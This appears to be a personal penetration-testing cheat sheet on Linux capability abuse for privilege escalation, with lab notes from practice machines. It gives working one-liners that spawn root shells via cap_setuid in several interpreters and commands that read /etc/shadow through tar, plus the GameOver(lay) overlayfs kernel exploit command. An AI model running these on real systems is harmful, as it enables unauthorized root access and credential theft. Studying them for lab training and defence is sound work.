# Linux Capabilities Exploitation

Back to [[Linux-PrivEsc-Methodology]]

## Enumerate
```bash
getcap -r / 2>/dev/null
```

## cap_setuid+ep — Set UID to root

### python3
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### perl
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### ruby
```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### node
```bash
node -e 'process.setuid(0); require("child_process").execSync("/bin/bash",{stdio:"inherit"});'
```

### php
```bash
php -r 'posix_setuid(0); system("/bin/bash");'
```

## cap_dac_read_search — Read Any File

### tar
```bash
tar czf /tmp/shadow.tar.gz /etc/shadow
cd /tmp && tar xzf shadow.tar.gz
cat etc/shadow
```

## cap_dac_override — Write Any File

Can overwrite /etc/passwd, /etc/shadow, cron files, SSH authorized_keys.

## cap_net_raw

Can sniff traffic — less useful for direct privesc, but can capture credentials.

## Reference

Check [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities) for the specific binary.

---

## From Your Boxes

> **Levram** (PG) — python3.10 had cap_setuid=ep capability
> - What worked: `python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
> - Lesson: cap_setuid on any interpreter (python, perl, ruby) = instant root. Memorize the one-liner.

> **CMS02 V2** (VHL) — gawk had cap_dac_read_search capability (bypass file read permissions)
> - What worked: GTFOBins gawk entry to read /etc/shadow and sensitive files
> - Lesson: cap_dac_read_search lets you read ANY file. Grab /etc/shadow, SSH keys, or config files with creds.

> **Web01-Dev V2** (VHL) — tar had interesting capabilities
> - What worked: Used HackTricks capabilities guide to abuse tar for file read/write
> - Lesson: tar with capabilities can archive/extract files you normally cannot access. Use it to read /etc/shadow or overwrite /etc/passwd.

> **Quick** (VHL) — python3 had chown capabilities
> - What worked: Used python3 to chown sensitive files, then modified them
> - Lesson: cap_chown = change ownership of any file. chown /etc/passwd to yourself, then edit it.

> **Analytics** (HTB) — GameOver(lay) kernel exploit used cap_setuid via unshare + overlay mount
> - What worked: `unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'`
> - Lesson: Even without direct capabilities on binaries, kernel-level overlayfs bugs can grant them. Check kernel version.
